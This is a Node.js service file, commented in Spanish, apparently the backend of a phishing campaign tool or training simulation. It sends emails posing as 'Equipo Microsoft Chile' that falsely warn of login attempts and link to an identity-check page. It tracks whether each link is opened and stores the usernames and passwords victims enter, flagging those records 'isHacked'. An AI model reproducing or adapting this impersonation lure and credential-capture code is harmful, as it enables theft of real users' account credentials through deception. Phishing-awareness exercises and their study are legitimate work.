"use strict";

const Mail = require("../models/mail.model.js");
const { handleError } = require("../utils/errorHandler");
const { sendEmail } = require("../middlewares/mailer.middleware");

/**
 * Obtiene todos los mail de la base de datos
 * @returns {Promise} Promesa con el objeto de las citas
 */
async function getMail() {
  try {
    const mail = await Mail.find().exec();
    if (!mail) return [null, "No hay correos"];

    return [mail, null];
  } catch (error) {
    handleError(error, "mail.service -> getMail");
  }
}

/**
 * Obtiene un mail de la base de datos por id
 * @returns {Promise} Promesa con el objeto de las citas
 */
async function getMailByCaseId(caseId) {
  try {
    const mail = await Mail.find({ caseId }).exec();
    if (!mail) return [null, "No hay correos"];

    console.log("Se accedio al enlace con la UID: ", caseId);
    await Mail.updateMany({ caseId }, { isOpen: true });

    return [mail, null];
  }
  catch (error) {
    handleError(error, "mail.service -> getMailById");
  }
}

/**
 * Crea todos los mail en la base de datos
 * @param {Object} meet Objeto de cita
 * @returns {Promise} Promesa con el objeto de cita creado
 */
async function postMail(mail, req) {
  try {
    const { name, from, email, subject, text, html, caseId } = mail;
    const newIp = req.ip;

    const newMail = new Mail({
      name,
      from,
      email,
      subject,
      text,
      html,
      caseId,
      isOpen: false,
    });

    const mailList= newMail.email;
    const fromMail= newMail.from;
    const subjectMail= newMail.subject;
    const textMail= newMail.text;
    const caseIdMail = newMail.caseId;

    const mailOptions = {
      from: fromMail,
      to: mailList,
      subject: subjectMail,
      text: textMail,
      html: `<p>Estimado usuario,</p>
             <p>Hemos recibido intentos de ingreso en su cuenta Microsoft, por motivos de seguridad solicitamos que ingrese en el siguiente enlace para corroborar su identidad:</p>
             <p><a href="http://localhost:5173/services/${caseIdMail}">Confirme su correo</a></p>
             <p>En Microsoft nos preocupamos por la seguridad de nuestros usuarios. Favor confirmar identidad a la brevedad.</p>
             <p>Equipo Microsoft Chile</p>`
    };

    await sendEmail(mailOptions);

    await newMail.save();
    return [newMail, null];
  } catch (error) {
    handleError(error, "mail.service -> postMail");
  }
};

/**
 * Edita las variables de inicio de sesión
 * @param {String} id ID of the mail
 * @param {String} userEntered User entered value
 * @param {String} passEntered Password entered value
 * @returns {Promise} Promesa con el objeto de mail actualizado
 */
async function putLogin(caseId, userEntered, passEntered) {
  try {
    const updatedMails = await Mail.updateMany({ caseId }, { userEntered, passEntered, isHacked: true }).exec();
    if (!updatedMails) return [null, "No existe el mail"];

    return [updatedMails, null];
  } catch (error) {
    handleError(error, "mail.service -> putLogin");
  }
}

/**
 * Elimina los mail de la base de datos
 * @param {String} id Id de la cita
 * @returns {Promise} Promesa con el objeto de citas
 */
async function deleteMail(id) {
  try {
    const mail = await Mail.findByIdAndDelete(id).exec();
    if (!mail) return [null, "No existe el mail"];
    
    return [mail, null];
  } catch (error) {
    handleError(error, "mail.service -> deleteMail");
  }
}


module.exports = {
  getMail,
  getMailByCaseId,
  postMail,
  putLogin,      
  deleteMail
};
